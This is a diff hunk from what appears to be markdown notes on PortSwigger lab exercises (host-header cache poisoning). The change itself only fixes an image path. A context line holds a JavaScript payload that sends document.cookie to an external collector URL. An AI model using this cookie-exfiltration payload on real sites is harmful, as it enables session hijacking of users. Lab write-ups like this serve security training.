@@ -450,7 +450,7 @@ Host: exploit-0a99003a0303811bc10e5ec601ad00e7.exploit-server.net
 document.location='https://Collaborator.com/?cookies='+document.cookie;
 ```  
 
-![Ambiguous Hosts](images\ambiguous-hosts.png)  
+![Ambiguous Hosts](images/ambiguous-hosts.png)  
 
 [PortSwigger Lab: Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)  
 
